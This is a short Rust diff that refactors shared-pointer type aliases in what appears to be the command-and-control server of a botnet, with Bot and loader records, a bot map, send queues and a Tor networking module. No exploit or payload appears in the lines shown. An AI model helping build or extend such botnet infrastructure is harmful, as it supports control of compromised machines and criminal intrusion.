@@ -10,8 +10,6 @@ use client_vars::types::send::BoogeymanSendPayload;
 use loader_vars::types::receive::LdrRcv;
 use loader_vars::types::send::LdrSnd;
 use shared::constants::communication_encryption_key;
-use shared::network::tor::MutexPtr;
-use shared::network::tor::RwPtr;
 use shared::network::tor::ServerReceive;
 use shared::network::tor::SrvRcvTp;
 use shared::utils::config::MibCnfg;
@@ -63,8 +61,8 @@ pub struct LoaderInstance {
 #[derive(Debug, Clone)]
 pub struct Bot {
     pub id: String,
-    pub client_instances: Vec<ClientInstance>,
-    pub loader_instances: Vec<LoaderInstance>,
+    pub client_instances: RwPtr<Vec<ClientInstance>>,
+    pub loader_instances: RwPtr<Vec<LoaderInstance>>,
     pub verified: bool,
     pub join_date: String,
     pub mib_config: Option<MibCnfg>,
@@ -73,8 +71,8 @@ pub struct Bot {
 impl Bot {
     pub fn new(
         id: String,
-        client_instances: Vec<ClientInstance>,
-        loader_instances: Vec<LoaderInstance>,
+        client_instances: RwPtr<Vec<ClientInstance>>,
+        loader_instances: RwPtr<Vec<LoaderInstance>>,
         verified: bool,
         mib_config: Option<MibCnfg>
     ) -> Self {
@@ -90,11 +88,13 @@ impl Bot {
 }
 pub type BotMap = HashMap<String, Bot>;
 pub type SendQueue = VecDeque<Vec<u8>>;
+pub type RwPtr<T> = Arc<RwLock<T>>;
+pub type MutexPtr<T> = Arc<Mutex<T>>;
 
 #[derive(Debug, Clone)]
 pub struct ServerHandler {
-    listener: Arc<RwLock<TcpListener>>,
-    pub bot_map: Arc<RwLock<BotMap>>,
+    listener: RwPtr<TcpListener>,
+    pub bot_map: RwPtr<BotMap>,
     pub loader_send_queue: HashMap<String, HashMap<u64, MutexPtr<SendQueue>>>,
     pub client_send_queue: HashMap<String, HashMap<u64, MutexPtr<SendQueue>>>,
     pub queue_tick_interval_ms: RwPtr<u64>,
